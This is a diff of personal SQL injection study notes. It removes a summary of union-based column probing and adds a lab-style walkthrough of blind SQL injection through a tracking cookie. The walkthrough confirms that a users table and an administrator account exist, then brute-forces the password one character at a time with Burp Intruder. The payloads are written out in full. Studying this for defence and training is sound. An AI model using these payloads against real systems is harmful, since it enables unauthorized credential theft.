@@ -40,17 +40,6 @@ c. Out-of-band: Using protocol to trigger SQL Injection. Results come to your sy
               3. Code review: Follow code path for input vectors.
               4. Tesst SQLi vulnerability.
 
-4. How to exploit SQL Injection?
---> 
-     Exploiting Error Based SQLi: Submit ' or " and search for errors.
-     Exploiting Union-Based SQLi: Figure Number of column and data types.
-                                  Determine num of column by using ORDER BY: select title, cost from product where id=1 order by 1--. Increase ORDER BY to observer diferent behaviour: order by 2-- , order by 3-- and so on. Using NULL values: select title,cost from product where id=1' UNION SELECT NULL--. Increment UNION SELECT: ' UNION SELECT NULL, NULL-- and so on.
-     Exploiting Boolean-based SQLi: Submit true or false condition. 
-     Exploiting Time-based SQLi: Submit payload that causes delay in application. 
-     Exploiting Out-of-band SQLi: Submit OAST Payloads and look for change.
-
-  
-
 ********** ERROR BASED **********
 
 ***** STEP #1: Determine # of columns *****
@@ -143,3 +132,46 @@ c. Out-of-band: Using protocol to trigger SQL Injection. Results come to your sy
 
 
 ********** BLIND SQL **********
+
+*** Blind SQLI with conditional responses ***
+
+1. Confirm that the paramter is vulnerable to blind SQLi
+
+cookie query: select tracking-id from tracking-table where trackingId='23f23fdxqd'
+
+-> If tracking id exists -> query return value -> welcome back msg
+-> If tracking id doesn't exists -> query returns nothing -> no welcome msg
+
+select tracking-id from tracking-table where trackingId='23f23fdxqd' and 1=1--'
+-> TRUE -> WELCOME back msg
+
+select tracking-id from tracking-table where trackingId='23f23fdxqd' and 1=0--'
+-> FALSE -> no WELCOME back msg
+
+2. Confirm that we have users table
+
+select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select 'x' from users LIMIT 1) = 'x'--'
+-> TRUE -> users table exists in database
+
+3. Confirm that username administrator exists users table
+
+select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select username from users where username='administrator') = 'administrator'--'
+-> administrator user exists
+
+4. Enumerate password of the administrator user
+
+select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select username from users where username='administrator' and LENGTH (password)>1) = 'administrator'--' 
+-> Use burp to check how many length is there in the password. $1$. 20 returned false, so it contains 20 character.
+
+  **** Using substring to find password. It checks one by one character ****
+
+select tracking-id from tracking-table where trackingId='23f23fdxqd' and (select substring(password,1,1) from users where username='administrator') = 'a'--'
+-> burp,(payload-type=bruteforcer): $a$. If 1st letter contains letter 'c' go to 2nd letter.
+-> burp payload(cluster-bomb): ' and (select substring(password,$1$,1) from users where username='administrator' and LENGTH (password)>1) = '$a$'--' 
+-> 1st type: number from 1 to 20. 2nd type: bruteforcer.
+
+    1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+
+    h6yuihlcu58ybxrdatgt
+
+
